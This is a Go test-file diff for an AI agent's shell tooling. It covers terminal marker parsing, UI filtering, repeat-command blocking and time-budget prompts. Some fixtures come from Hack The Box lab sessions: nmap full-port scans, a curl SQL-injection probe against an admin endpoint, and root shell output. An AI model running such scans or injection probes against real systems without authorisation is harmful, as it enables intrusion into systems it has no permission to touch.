@@ -6,6 +6,7 @@ import (
 	"errors"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 	"time"
@@ -57,7 +58,7 @@ func TestBuildChatRequestUsesAllActiveProfileGenerationSettings(t *testing.T) {
 	}}
 	msgs := []llm.Message{llm.NewTextMessage(llm.RoleUser, "hello")}
 
-	req := buildChatRequest(profile, msgs, tools, "", false, false)
+	req := buildChatRequest(profile, msgs, tools, "", false, false, "medium")
 
 	if req.MaxTokens != 7777 {
 		t.Fatalf("MaxTokens = %d, want 7777", req.MaxTokens)
@@ -98,7 +99,7 @@ func TestBuildChatRequestUsesNoThinkSettingsWhenThinkingDisabled(t *testing.T) {
 		},
 	}
 
-	req := buildChatRequest(profile, nil, nil, "", false, false)
+	req := buildChatRequest(profile, nil, nil, "", false, false, "medium")
 
 	if req.MaxTokens != 2048 || req.Temperature != 0.44 || req.Seed != 88 {
 		t.Fatalf("nothinking params not selected: %#v", req)
@@ -123,7 +124,7 @@ func TestBuildChatRequestUsesCodingSettingsForNoThinkCodeTasks(t *testing.T) {
 		},
 	}
 
-	req := buildChatRequest(profile, nil, nil, "", false, true)
+	req := buildChatRequest(profile, nil, nil, "", false, true, "medium")
 
 	if req.EnableThinking {
 		t.Fatalf("EnableThinking = true, want false")
@@ -148,7 +149,7 @@ func TestBuildChatRequestUsesCodingSettingsForCodeTasks(t *testing.T) {
 		},
 	}
 
-	req := buildChatRequest(profile, nil, nil, "", false, shouldUseCodingParams("please write the full PowerShell script", AgentMode{Name: "Manual"}))
+	req := buildChatRequest(profile, nil, nil, "", false, shouldUseCodingParams("please write the full PowerShell script", AgentMode{Name: "Manual"}), "medium")
 
 	if req.MaxTokens != 8192 || req.Temperature != 0.6 || req.Seed != 22 {
 		t.Fatalf("coding params not selected for script request: %#v", req)
@@ -427,6 +428,11 @@ func TestRecordBackendRuntimeMismatchAddsInfoForLargerBackend(t *testing.T) {
 
 	if len(run.Events) != 1 || !strings.Contains(run.Events[0].Detail, "severity=info") {
 		t.Fatalf("expected info event for larger backend context, got %#v", run.Events)
+	}
+
+	app.recordBackendRuntimeMismatch(context.Background(), client, profile, &run)
+	if len(run.Events) != 1 {
+		t.Fatalf("larger backend context info should only be recorded once, got %#v", run.Events)
 	}
 }
 
@@ -733,12 +739,24 @@ func TestTaskRunTerminalStopOverridesRecoverableStopReason(t *testing.T) {
 	}
 }
 
+func TestFinalStoppedRunStateDistinguishesUserStopFromBlocked(t *testing.T) {
+	if got := finalStoppedRunState("user_stopped"); got != "stopped" {
+		t.Fatalf("user stop state = %q, want stopped", got)
+	}
+	if got := finalStoppedRunState("web_research_failed"); got != "blocked" {
+		t.Fatalf("budget block state = %q, want blocked", got)
+	}
+}
+
 func TestRecoverableInferenceFailureClassifier(t *testing.T) {
 	if !isRecoverableInferenceFailure(`HTTP 500: {"error":{"message":"Inference failed: error sending request for url (http://127.0.0.1:20688/completion)"}}`) {
 		t.Fatal("expected backend HTTP 500 request failure to be recoverable")
 	}
 	if !isRecoverableInferenceFailure(`Post "http://127.0.0.1:8802/v1/chat/completions": dial tcp 127.0.0.1:8802: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.`) {
 		t.Fatal("expected Windows connectex bridge failure to be recoverable")
+	}
+	if !isRecoverableInferenceFailure(`Post "http://127.0.0.1:8802/v1/chat/completions": readfrom tcp 127.0.0.1:1366->127.0.0.1:8802: write tcp 127.0.0.1:1366->127.0.0.1:8802: wsasend: An existing connection was forcibly closed by the remote host.`) {
+		t.Fatal("expected Windows wsasend bridge failure to be recoverable")
 	}
 	if isRecoverableInferenceFailure(`tool "web_search" is disabled in settings`) {
 		t.Fatal("disabled tools should not be treated as recoverable inference failures")
@@ -790,12 +808,25 @@ func TestToolChoiceDisablesToolsForSmallTalkButNotShortTasks(t *testing.T) {
 		}
 	}
 
-	for _, text := range []string{"fix bug", "run tests", "read README.md", "list files", "search for config"} {
+	// Action tasks with no explicit inspection/operational intent leave the choice
+	// to the model (auto) on the first turn.
+	for _, text := range []string{"fix bug", "run tests", "search for config"} {
 		if looksConversational(text) {
 			t.Fatalf("%q should be treated as a tool-capable task", text)
 		}
 		if got := toolChoiceFor(text, 0, 0); got != "auto" {
 			t.Fatalf("toolChoiceFor(%q) = %q, want auto", text, got)
+		}
+	}
+
+	// Explicit repository-inspection intent forces a tool call on the opening turn
+	// so the model cannot narrate instead of acting.
+	for _, text := range []string{"read README.md", "list files"} {
+		if looksConversational(text) {
+			t.Fatalf("%q should be treated as a tool-capable task", text)
+		}
+		if got := toolChoiceFor(text, 0, 0); got != "required" {
+			t.Fatalf("toolChoiceFor(%q) = %q, want required", text, got)
 		}
 	}
 }
@@ -816,15 +847,15 @@ func TestToolDefsOmittedForConversationalTurn(t *testing.T) {
 	}
 }
 
-func TestToolDefsPreferDirectShellForHTBWSLTasks(t *testing.T) {
+func TestToolDefsKeepStrictShellForHTBWSLTasksInBalancedMode(t *testing.T) {
 	registry := tools.New()
 	cfg := settings.DefaultSettings().Tools
 	cfg.ActiveToolset = "balanced"
 	prompt := "Resume HTB Connected against target IP 10.129.12.172. Use WSL sudo and run nmap before exploitation."
 
 	defs, choice := toolDefsAndChoiceForTurn(registry, cfg, prompt, 0, 0)
-	if choice != "auto" {
-		t.Fatalf("choice = %q, want auto", choice)
+	if choice != "required" {
+		t.Fatalf("choice = %q, want required", choice)
 	}
 	seen := map[string]bool{}
 	for _, def := range defs {
@@ -833,8 +864,31 @@ func TestToolDefsPreferDirectShellForHTBWSLTasks(t *testing.T) {
 	if !seen["shell"] || !seen["bash"] {
 		t.Fatalf("HTB/WSL task should expose direct shell tools, got %#v", seen)
 	}
-	if seen["subagent_research"] {
-		t.Fatalf("HTB/WSL task should not expose web-research subagent for shell work")
+	for _, blocked := range []string{"web_search", "fetch_url", "browser_open", "browser_snapshot", "subagent_research"} {
+		if seen[blocked] {
+			t.Fatalf("HTB/WSL task should not expose host-side research tool %s for shell work", blocked)
+		}
+	}
+}
+
+func TestToolDefsKeepResearchToolsForHTBWSLTasksInUnrestrictedMode(t *testing.T) {
+	registry := tools.New()
+	cfg := settings.DefaultSettings().Tools
+	cfg.ActiveToolset = "unrestricted"
+	prompt := "Resume HTB Connected against target IP 10.129.12.172. Use WSL sudo and run nmap before exploitation."
+
+	defs, choice := toolDefsAndChoiceForTurn(registry, cfg, prompt, 0, 0)
+	if choice != "required" {
+		t.Fatalf("choice = %q, want required", choice)
+	}
+	seen := map[string]bool{}
+	for _, def := range defs {
+		seen[def.Function.Name] = true
+	}
+	for _, want := range []string{"shell", "bash", "web_search", "fetch_url", "browser_open", "browser_snapshot"} {
+		if !seen[want] {
+			t.Fatalf("unrestricted HTB/WSL task should keep %s available, got %#v", want, seen)
+		}
 	}
 }
 
@@ -845,6 +899,16 @@ func TestToolErrorResultPreservesCapturedOutput(t *testing.T) {
 	}
 	if got := toolErrorResult("", errors.New("exit code 1")); got != "error: exit code 1" {
 		t.Fatalf("empty output fallback = %q", got)
+	}
+}
+
+func TestNeedsInspectionToolSkipsOpsTargetPrompts(t *testing.T) {
+	prompt := "HTB Red Team Operator / Navigator Framework against target IP 10.129.245.100 with WSL/Kali"
+	if needsInspectionTool(prompt) {
+		t.Fatalf("ops target prompt should not force repository inspection")
+	}
+	if !needsOperationalTool(prompt) {
+		t.Fatalf("ops target prompt should use operational recovery")
 	}
 }
 
@@ -940,6 +1004,30 @@ func TestAgentToolBudgetSummaryPromptForbidsToolMarkup(t *testing.T) {
 	}
 }
 
+func TestAgentTimeBudgetSummaryPromptForbidsToolMarkup(t *testing.T) {
+	started := time.Unix(100, 0)
+	if !agentTimeBudgetExhausted(settings.AgentsConfig{MaxRunSeconds: 30}, started, started.Add(31*time.Second)) {
+		t.Fatalf("expected time budget to be exhausted after configured seconds")
+	}
+	if agentTimeBudgetExhausted(settings.AgentsConfig{MaxRunSeconds: 30}, started, started.Add(30*time.Second)) {
+		t.Fatalf("time budget should not be exhausted at the exact configured second")
+	}
+	if agentTimeBudgetExhausted(settings.AgentsConfig{MaxRunSeconds: 0}, started, started.Add(24*time.Hour)) {
+		t.Fatalf("zero max_run_seconds should be unlimited")
+	}
+	prompt := agentTimeBudgetSummaryPrompt(30)
+	for _, want := range []string{
+		"Agent wall-clock time budget is exhausted (30 seconds)",
+		"Do not emit tool calls or tool markup",
+		"final progress summary",
+		"ask the user before continuing",
+	} {
+		if !strings.Contains(prompt, want) {
+			t.Fatalf("time budget summary prompt missing %q:\n%s", want, prompt)
+		}
+	}
+}
+
 func TestSharedTerminalWrapperUsesMarkers(t *testing.T) {
 	start, donePrefix, wrapped := sharedTerminalWrapper(`printf 'ok\n'`, "abc123")
 	if start != "__MAULER_START_abc123__" {
@@ -948,10 +1036,446 @@ func TestSharedTerminalWrapperUsesMarkers(t *testing.T) {
 	if donePrefix != "__MAULER_DONE_abc123:" {
 		t.Fatalf("done prefix = %q", donePrefix)
 	}
-	for _, want := range []string{"set -o pipefail", "printf '%s\\n'", start, "printf 'ok\\n'", donePrefix, "status=$?"} {
+	// The wrapped command must build markers from a variable so the echoed
+	// command never carries a literal marker — that's what stops wrapped echo
+	// fragments from being misparsed as a real START/DONE/CWD line.
+	for _, banned := range []string{"__MAULER_START_", "__MAULER_DONE_", "__MAULER_CWD_"} {
+		if strings.Contains(wrapped, banned) {
+			t.Fatalf("wrapped command leaks literal marker %q (echo could be misparsed): %s", banned, wrapped)
+		}
+	}
+	for _, want := range []string{"M=__MA''ULER_", "${M}START_abc123__", "${M}DONE_abc123:", "${M}CWD_abc123__", "printf 'ok\\n'", "status=$?"} {
 		if !strings.Contains(wrapped, want) {
 			t.Fatalf("wrapped command missing %q: %s", want, wrapped)
 		}
+	}
+}
+
+func TestContainsShellHeredoc(t *testing.T) {
+	cases := []string{
+		"cat <<EOF\nhello\nEOF",
+		"sudo tee -a /etc/hosts <<EOF\n10.1.1.1 test\nEOF",
+		"printf x | tee /tmp/x; cat <<-'DONE'\nhello\nDONE",
+	}
+	for _, command := range cases {
+		if !containsShellHeredoc(command) {
+			t.Fatalf("expected heredoc detection for %q", command)
+		}
+	}
+	for _, command := range []string{
+		"printf '%s\\n' '10.1.1.1 test' | sudo -n tee -a /etc/hosts",
+		"grep '<<EOF' notes.txt",
+	} {
+		if containsShellHeredoc(command) {
+			t.Fatalf("unexpected heredoc detection for %q", command)
+		}
+	}
+}
+
+func TestStripTrailingBackgroundOperator(t *testing.T) {
+	got, ok := stripTrailingBackgroundOperator(`sudo nmap -sV -p- 10.0.0.1 &`)
+	if !ok || got != `sudo nmap -sV -p- 10.0.0.1` {
+		t.Fatalf("strip background = %q, %v", got, ok)
+	}
+	if got, ok := stripTrailingBackgroundOperator(`printf '%s\n' "a & b"`); ok || got == "" {
+		t.Fatalf("quoted ampersand should not be stripped: %q, %v", got, ok)
+	}
+	if _, ok := stripTrailingBackgroundOperator(`echo a &&`); ok {
+		t.Fatal("logical && should not be treated as a background operator")
+	}
+}
+
+func TestShellAssignmentJobID(t *testing.T) {
+	if got := shellAssignmentJobID(`job="j12"`); got != "j12" {
+		t.Fatalf("job assignment id = %q, want j12", got)
+	}
+	if got := shellAssignmentJobID(`echo job="j12"`); got != "" {
+		t.Fatalf("non-assignment should not poll job: %q", got)
+	}
+}
+
+func TestBackgroundJobPollBackoff(t *testing.T) {
+	if got := backgroundJobPollInterval(0); got != time.Second {
+		t.Fatalf("first interval = %s, want 1s", got)
+	}
+	if got := backgroundJobPollInterval(1); got != 2*time.Second {
+		t.Fatalf("second interval = %s, want 2s", got)
+	}
+	if got := backgroundJobPollInterval(8); got != 30*time.Second {
+		t.Fatalf("later interval = %s, want 30s", got)
+	}
+	now := time.Now()
+	job := &bgJob{id: "j1", started: now.Add(-10 * time.Second), lastPoll: now.Add(-500 * time.Millisecond), pollCount: 0, lastState: "running"}
+	wait, tooEarly := backgroundJobPollWait(job, now)
+	if !tooEarly || wait <= 0 {
+		t.Fatalf("expected early poll wait, got wait=%s tooEarly=%v", wait, tooEarly)
+	}
+	msg := formatBackgroundJobTooEarly(job, wait)
+	if !strings.Contains(msg, "poll skipped: too early") || !strings.Contains(msg, `"job":"j1"`) {
+		t.Fatalf("unexpected early poll message: %q", msg)
+	}
+}
+
+func TestRepeatedShellFailureBlock(t *testing.T) {
+	tc := llm.ToolCallDef{
+		Function: llm.FunctionCall{
+			Name:      "shell",
+			Arguments: json.RawMessage(`{"command":"sudo nmap -sV -sC -p- --min-rate 1000 -oN /tmp/connected_nmap.txt 10.129.245.100 &"}`),
+		},
+	}
+	run := TaskRun{
+		Tools: []TaskToolEvent{
+			{Name: "shell", Status: "error", Input: `{"command":"sudo nmap -sV -sC -p- --min-rate 1000 -oN /tmp/connected_nmap.txt 10.129.245.100"}`},
+			{Name: "shell", Status: "error", Input: `{"command":"sudo nmap -sV -sC -p- --min-rate 1000 -oN /tmp/connected_nmap.txt 10.129.245.100 &"}`},
+		},
+	}
+	if got := repeatedShellFailureBlock(run, tc); !strings.Contains(got, "Repeated shell command blocked") {
+		t.Fatalf("expected repeat block, got %q", got)
+	}
+}
+
+func TestRepeatedShellEmptyOutputBlock(t *testing.T) {
+	command := `curl -s http://connected.htb/admin/ | head -n 100`
+	tc := llm.ToolCallDef{
+		Function: llm.FunctionCall{
+			Name:      "bash",
+			Arguments: json.RawMessage(`{"command":"curl -s http://connected.htb/admin/ | head -n 100"}`),
+		},
+	}
+	run := TaskRun{
+		Tools: []TaskToolEvent{
+			{Name: "bash", Status: "done", Input: `{"command":"` + command + `"}`, Result: "[shared_terminal/wsl exit 0, 62ms]\ncwd: /mnt/c/Users/richa/Documents/HTB_writeups"},
+			{Name: "bash", Status: "done", Input: `{"command":"` + command + `"}`, Result: "[shared_terminal/wsl exit 0, 64ms]\ncwd: /mnt/c/Users/richa/Documents/HTB_writeups\n[empty shell output: command exited successfully but produced no stdout/stderr.]"},
+		},
+	}
+	got := repeatedShellEmptyOutputBlock(run, tc)
+	if !strings.Contains(got, "empty successful results") {
+		t.Fatalf("expected empty-output repeat block, got %q", got)
+	}
+}
+
+func TestRepeatedShellSameResultBlock(t *testing.T) {
+	command := `curl -s --max-time 10 "http://connected.htb/admin/ajax.php?x=sqli" 2>&1 | grep -o "syntax error: '[^']*'"`
+	inputBytes, err := json.Marshal(map[string]string{"command": command})
+	if err != nil {
+		t.Fatal(err)
+	}
+	tc := llm.ToolCallDef{
+		Function: llm.FunctionCall{
+			Name:      "bash",
+			Arguments: json.RawMessage(inputBytes),
+		},
+	}
+	run := TaskRun{
+		Tools: []TaskToolEvent{
+			{Name: "bash", Status: "done", Input: string(inputBytes), Result: "syntax error: '~da43a~'\n\n[shared_terminal/wsl exit 0, 211ms]\ncwd: /mnt/c/Users/richa/Documents/HTB_writeups"},
+			{Name: "bash", Status: "done", Input: string(inputBytes), Result: "syntax error: '~da43a~'\n\n[shared_terminal/wsl exit 0, 201ms]\ncwd: /mnt/c/Users/richa/Documents/HTB_writeups"},
+		},
+	}
+	got := repeatedShellSameResultBlock(run, tc)
+	if !strings.Contains(got, "identical successful results") || !strings.Contains(got, "~da43a~") {
+		t.Fatalf("expected same-result repeat block, got %q", got)
+	}
+}
+
+func TestEmptyShellOutputResultIgnoresMetadata(t *testing.T) {
+	if !isEmptyShellOutputResult("[shared_terminal/wsl exit 0, 62ms]\ncwd: /tmp/x") {
+		t.Fatal("metadata-only shell result should be empty")
+	}
+	if isEmptyShellOutputResult("HTTP/1.1 301 Moved Permanently\n[shared_terminal/wsl exit 0, 62ms]") {
+		t.Fatal("result with response body/header should not be empty")
+	}
+}
+
+func TestBackendPromptTokensNeedCompaction(t *testing.T) {
+	if !backendPromptTokensNeedCompaction(27000, 32000, 0.85) {
+		t.Fatal("backend usage over capped threshold should compact")
+	}
+	if backendPromptTokensNeedCompaction(12000, 32000, 0.85) {
+		t.Fatal("low backend usage should not compact")
+	}
+}
+
+func TestShouldRequestRecoveryReport(t *testing.T) {
+	if !shouldRequestRecoveryReport(TaskRun{StopReason: "repeated_same_tool_result"}, false) {
+		t.Fatal("blocking tool stop should request a recovery report")
+	}
+	if shouldRequestRecoveryReport(TaskRun{StopReason: "repeated_same_tool_result"}, true) {
+		t.Fatal("recovery report should only be requested once")
+	}
+	if shouldRequestRecoveryReport(TaskRun{StopReason: "user_stopped"}, false) {
+		t.Fatal("user stops should not trigger automatic recovery")
+	}
+	if shouldRequestRecoveryReport(TaskRun{StopReason: "tool_budget_exhausted"}, false) {
+		t.Fatal("tool budget has its own text-only summary path")
+	}
+	if shouldRequestRecoveryReport(TaskRun{}, false) {
+		t.Fatal("missing stop reason should not trigger recovery")
+	}
+}
+
+func TestRecoveryReportPromptIncludesRecentToolEvidence(t *testing.T) {
+	prompt := recoveryReportPrompt(TaskRun{
+		StopReason: "repeated_same_tool_result",
+		StopDetail: "same curl result repeated",
+		Tools: []TaskToolEvent{
+			{Name: "bash", Status: "blocked", Input: `{"command":"curl -s http://connected.htb/admin/"}`, Result: "syntax error: '~da43a~'"},
+		},
+	})
+	for _, want := range []string{"Recovery mode", "Do not call tools", "repeated_same_tool_result", "curl -s", "~da43a~", "Safest next action"} {
+		if !strings.Contains(prompt, want) {
+			t.Fatalf("recovery prompt missing %q:\n%s", want, prompt)
+		}
+	}
+}
+
+func TestSharedTerminalParserIgnoresEchoAndWrapping(t *testing.T) {
+	start, donePrefix, _ := sharedTerminalWrapper("id", "99")
+	p := newSharedTerminalParser(start, donePrefix, "99")
+
+	// Lines that arrive before the real START output (the echoed command, possibly
+	// wrapped into fragments). With variable markers these carry no literal marker,
+	// so none should be captured or end the command.
+	echoFragments := []string{
+		`M=__MA''ULER_; set -o pipefail 2>/dev/null || true; printf '%s\n' "${M}START_99`,
+		`__"; { id; }; status=$?; printf '%s\n' "${M}CWD_99__$PWD"; printf '%s%s\n' "${M}DONE_99:" "$status"`,
+	}
+	for _, frag := range echoFragments {
+		if done, _ := p.feed(terminalOutput{data: frag, stream: "stdout"}); done {
+			t.Fatalf("echo fragment wrongly treated as done: %q", frag)
+		}
+	}
+	if len(p.out) != 0 {
+		t.Fatalf("echo captured as output: %#v", p.out)
+	}
+
+	// Defense-in-depth: even a literal DONE marker with a non-numeric status
+	// (the old crash: status parsed as a quote) is ignored, not fatal.
+	if done, _ := p.feed(terminalOutput{data: `__MAULER_DONE_99:' "$status"`, stream: "stdout"}); done {
+		t.Fatal("garbage DONE status should be ignored, not completed")
+	}
+
+	// Real marker OUTPUT lines drive the result.
+	p.feed(terminalOutput{data: "__MAULER_START_99__", stream: "stdout"})
+	p.feed(terminalOutput{data: "uid=0(root) gid=0(root)", stream: "stdout"})
+	p.feed(terminalOutput{data: "__MAULER_CWD_99__/root/loot", stream: "stdout"})
+	done, code := p.feed(terminalOutput{data: "__MAULER_DONE_99:0", stream: "stdout"})
+	if !done || code != 0 {
+		t.Fatalf("real DONE not parsed: done=%v code=%d", done, code)
+	}
+	if len(p.out) != 1 || p.out[0].data != "uid=0(root) gid=0(root)" {
+		t.Fatalf("captured output = %#v", p.out)
+	}
+	if p.cwd != "/root/loot" {
+		t.Fatalf("cwd = %q", p.cwd)
+	}
+}
+
+func TestSharedTerminalCWDExtractAndStrip(t *testing.T) {
+	// Extraction from the cwd marker line.
+	cwd, ok := sharedTerminalCWD("__MAULER_CWD_abc123__/home/kali/loot", "abc123")
+	if !ok || cwd != "/home/kali/loot" {
+		t.Fatalf("cwd extract = %q ok=%v", cwd, ok)
+	}
+	if _, ok := sharedTerminalCWD("regular output line", "abc123"); ok {
+		t.Fatal("non-cwd line should not parse as cwd")
+	}
+
+	// The UI filter drops the whole cwd line (path and all), even with a space.
+	var f uiMarkerFilter
+	got := string(f.feed([]byte("real output\n__MAULER_CWD_abc123__/home/My Files\nmore\n")))
+	got += string(f.flush())
+	if got != "real output\nmore\n" {
+		t.Fatalf("cwd line not stripped from UI: %q", got)
+	}
+
+	// A cwd marker split across reads is still dropped.
+	f = uiMarkerFilter{}
+	got = string(f.feed([]byte("x\n__MAULER_CWD_ab")))
+	got += string(f.feed([]byte("c123__/tmp\ny\n")))
+	got += string(f.flush())
+	if got != "x\ny\n" {
+		t.Fatalf("split cwd line not stripped: %q", got)
+	}
+}
+
+func TestTerminalOutputRecordsBuffersPartialLines(t *testing.T) {
+	records, pending := terminalOutputRecords("__MAULER_DO", "stdout", false)
+	if len(records) != 0 || pending != "__MAULER_DO" {
+		t.Fatalf("first partial = records %#v pending %q", records, pending)
+	}
+	records, pending = terminalOutputRecords(pending+"NE_abc123:0\n", "stdout", false)
+	if pending != "" {
+		t.Fatalf("pending after newline = %q", pending)
+	}
+	if len(records) != 1 || records[0].data != "__MAULER_DONE_abc123:0" {
+		t.Fatalf("records = %#v", records)
+	}
+}
+
+func TestUIMarkerFilterStripsMarkers(t *testing.T) {
+	var f uiMarkerFilter
+	// START on its own line is removed completely (no blank line left behind).
+	got := string(f.feed([]byte("hello\n__MAULER_START_123__\nworld\n")))
+	got += string(f.flush())
+	if got != "hello\nworld\n" {
+		t.Fatalf("start strip = %q", got)
+	}
+
+	// DONE attached to output keeps the output and its newline.
+	f = uiMarkerFilter{}
+	got = string(f.feed([]byte("200 OK__MAULER_DONE_123:0\n$ ")))
+	got += string(f.flush())
+	if got != "200 OK\n$ " {
+		t.Fatalf("done strip = %q", got)
+	}
+
+	// A marker split across two reads is still removed.
+	f = uiMarkerFilter{}
+	got = string(f.feed([]byte("out__MAULER_DO")))
+	got += string(f.feed([]byte("NE_123:7\nmore")))
+	got += string(f.flush())
+	if got != "out\nmore" {
+		t.Fatalf("split marker strip = %q", got)
+	}
+
+	// Interactive output with no newline is passed through immediately (not held).
+	f = uiMarkerFilter{}
+	if got = string(f.feed([]byte("password: "))); got != "password: " {
+		t.Fatalf("interactive passthrough = %q", got)
+	}
+
+	// A false "__MAULER_" that is not a real marker passes through.
+	f = uiMarkerFilter{}
+	got = string(f.feed([]byte("__MAULER_NOPE here")))
+	got += string(f.flush())
+	if got != "__MAULER_NOPE here" {
+		t.Fatalf("false marker = %q", got)
+	}
+
+	// The echoed wrapper command (both markers on one line) is dropped whole.
+	f = uiMarkerFilter{}
+	echo := "set -o pipefail 2>/dev/null || true; printf '%s\\n' '__MAULER_START_9__'; { id; }; status=$?; printf '%s%s\\n' '__MAULER_DONE_9:' \"$status\"\n"
+	got = string(f.feed([]byte(echo)))
+	got += string(f.flush())
+	if got != "" {
+		t.Fatalf("wrapper echo not dropped: %q", got)
+	}
+
+	// The variable-marker wrapper echo carries no literal __MAULER_, so it must be
+	// recognised by its assignment signature and dropped — including when it lands
+	// as a trailing partial line before its newline arrives (the leak seen live).
+	f = uiMarkerFilter{}
+	varEcho := `M=__MA''ULER_; set -o pipefail 2>/dev/null || true; printf '%s\n' "${M}START_123__"; { curl -sL http://x ; }; status=$?; printf '%s%s\n' "${M}DONE_123:" "$status"`
+	if got = string(f.feed([]byte(varEcho))); got != "" {
+		t.Fatalf("variable wrapper echo leaked before newline: %q", got)
+	}
+	got = string(f.feed([]byte("\n403\n")))
+	got += string(f.flush())
+	if got != "403\n" {
+		t.Fatalf("variable wrapper echo not dropped (want just the 403 output): %q", got)
+	}
+
+	// The live leak: the prompt was already emitted as a partial line, then the
+	// wrapper echo arrived on that same prompt line. The filter should clear the
+	// prompt row and suppress the wrapper, not stream the wrapper text.
+	f = uiMarkerFilter{}
+	got = string(f.feed([]byte("root@HomePc:/tmp$ ")))
+	got += string(f.feed([]byte(`M=__MA''ULER_; set -o pipefail; printf '%s\n' "${M}START_456__"; { id; }; status=$?; printf '%s%s\n' "${M}DONE_456:" "$status"`)))
+	got += string(f.feed([]byte("\nuid=0(root)\n")))
+	got += string(f.flush())
+	if strings.Contains(got, "M=__MA") || strings.Contains(got, "START_456") || !strings.Contains(got, "\r\x1b[2K") || !strings.Contains(got, "uid=0(root)\n") {
+		t.Fatalf("prompt-prefixed wrapper echo was not suppressed correctly: %q", got)
+	}
+
+	f = uiMarkerFilter{}
+	got = ""
+	for _, chunk := range []string{
+		"M", "=__", "MA", "''", "UL", "ER_; set -o pipefail; printf '%s\\n' \"${M}START_789__\"; { grep connected /etc/hosts; }; status=$?; printf '%s%s\\n' \"${M}DONE_789:\" \"$status\"",
+		"\n10.129.245.100 connected.htb\n",
+	} {
+		got += string(f.feed([]byte(chunk)))
+	}
+	got += string(f.flush())
+	if strings.Contains(got, "M=__MA") || strings.Contains(got, "START_789") || strings.Contains(got, "DONE_789") {
+		t.Fatalf("chunked wrapper echo leaked to UI: %q", got)
+	}
+	if !strings.Contains(got, "10.129.245.100 connected.htb\n") {
+		t.Fatalf("command output was lost: %q", got)
+	}
+}
+
+// TestUIMarkerFilterSuppressesTruncatedWrapperEcho reproduces the live leak: a
+// racy `stty -echo` ate a *variable-length prefix* of the `M=__MA”ULER_`
+// assignment, so the echoed wrapper arrived as `MA”ULER_; …` or even `LER_; …`
+// with no `M=__` at all. markerEchoSig (which needs the full prefix) then missed
+// it and the wrapper leaked. The truncation-proof signatures (${M}, pipefail)
+// must catch every truncation, on its own prompt row, and erase the row.
+func TestUIMarkerFilterSuppressesTruncatedWrapperEcho(t *testing.T) {
+	// Exact suffixes observed live (block 1/3: "MA''ULER_;", block 2: "LER_;").
+	truncations := []string{
+		`MA''ULER_`,
+		`A''ULER_`,
+		`''ULER_`,
+		`ULER_`,
+		`LER_`,
+	}
+	for _, pre := range truncations {
+		var f uiMarkerFilter
+		echo := pre + `; set -o pipefail 2>/dev/null || true; printf '%s\n' "${M}START_111__"; { grep connected.htb /etc/hosts || true; }; status=$?; printf '%s\n' "${M}CWD_111__$PWD"; printf '%s%s\n' "${M}DONE_111:" "$status"`
+		got := string(f.feed([]byte(echo)))
+		got += string(f.feed([]byte("\n10.129.245.100 connected.htb\n")))
+		got += string(f.flush())
+		if strings.Contains(got, "pipefail") || strings.Contains(got, "${M}") ||
+			strings.Contains(got, "ULER_") || strings.Contains(got, "printf") {
+			t.Fatalf("truncated wrapper echo (prefix %q) leaked to UI: %q", pre, got)
+		}
+		if !strings.Contains(got, "10.129.245.100 connected.htb\n") {
+			t.Fatalf("command output lost for prefix %q: %q", pre, got)
+		}
+	}
+
+	// Same truncation, but the prompt was already streamed on the row first: the
+	// row must be cleared (\r\x1b[2K) and the wrapper text never shown.
+	var f uiMarkerFilter
+	got := string(f.feed([]byte("root@HomePc:.../HTB_writeups$ ")))
+	got += string(f.feed([]byte(`LER_; set -o pipefail 2>/dev/null || true; printf '%s\n' "${M}START_222__"; { id; }; status=$?; printf '%s%s\n' "${M}DONE_222:" "$status"`)))
+	got += string(f.feed([]byte("\nuid=0(root)\n")))
+	got += string(f.flush())
+	if strings.Contains(got, "pipefail") || strings.Contains(got, "${M}") || strings.Contains(got, "ULER_") {
+		t.Fatalf("prompt-prefixed truncated wrapper echo leaked: %q", got)
+	}
+	if !strings.Contains(got, "\r\x1b[2K") || !strings.Contains(got, "uid=0(root)\n") {
+		t.Fatalf("prompt row not cleared or output lost: %q", got)
+	}
+}
+
+// TestUIMarkerFilterStripsRecoverySentinel covers the interrupt-recovery path:
+// the echoed recovery command (which contains `stty echo …`) is suppressed via
+// the stty signature, and the printed `__MAULER_RECOVER_<id>__` sentinel output
+// is stripped so the user never sees Mauler's recovery plumbing.
+func TestUIMarkerFilterStripsRecoverySentinel(t *testing.T) {
+	var f uiMarkerFilter
+	// Echoed recovery command line (carries the stty echo signature) + the sentinel
+	// output line that the shell prints, followed by a real prompt.
+	got := string(f.feed([]byte("stty echo 2>/dev/null || true; printf '%s\\n' '__MAULER_RECOVER_77__'\n")))
+	got += string(f.feed([]byte("__MAULER_RECOVER_77__\n")))
+	got += string(f.feed([]byte("root@HomePc:/tmp$ ")))
+	got += string(f.flush())
+	if strings.Contains(got, "__MAULER_RECOVER_") || strings.Contains(got, "stty echo") {
+		t.Fatalf("recovery plumbing leaked to UI: %q", got)
+	}
+	if !strings.Contains(got, "root@HomePc:/tmp$ ") {
+		t.Fatalf("prompt after recovery was lost: %q", got)
+	}
+
+	// The sentinel split across reads is still fully stripped.
+	f = uiMarkerFilter{}
+	got = string(f.feed([]byte("__MAULER_REC")))
+	got += string(f.feed([]byte("OVER_88__\nback\n")))
+	got += string(f.flush())
+	if got != "back\n" {
+		t.Fatalf("split recovery sentinel not stripped: %q", got)
 	}
 }
 
@@ -966,6 +1490,38 @@ func TestSplitSharedTerminalDoneHandlesMarkerAttachedToOutput(t *testing.T) {
 	}
 	if preDone != "200 http://connected.htb/admin/config.php" {
 		t.Fatalf("preDone = %q", preDone)
+	}
+}
+
+func TestParseSharedTerminalExitCodeRejectsBadMarker(t *testing.T) {
+	if code, err := parseSharedTerminalExitCode("130"); err != nil || code != 130 {
+		t.Fatalf("valid exit code = %d, %v", code, err)
+	}
+	if code, err := parseSharedTerminalExitCode("not-a-code"); err == nil || code != -1 {
+		t.Fatalf("invalid exit code = %d, %v; want -1 and error", code, err)
+	}
+}
+
+func TestSharedTerminalBackendResolutionMatchesRuntime(t *testing.T) {
+	wantAuto := "bash"
+	wantAutoSupported := true
+	if runtime.GOOS == "windows" {
+		wantAuto = "powershell"
+		wantAutoSupported = false
+	}
+	if got := resolveSharedTerminalBackend("auto"); got != wantAuto {
+		t.Fatalf("auto backend resolved to %q, want %q", got, wantAuto)
+	}
+	if got := sharedTerminalSupportsBackend("auto"); got != wantAutoSupported {
+		t.Fatalf("auto backend support = %v, want %v", got, wantAutoSupported)
+	}
+	if !sharedTerminalSupportsBackend("bash") || !sharedTerminalSupportsBackend("wsl") {
+		t.Fatal("bash and wsl should support shared terminal")
+	}
+	for _, backend := range []string{"powershell", "pwsh", "cmd"} {
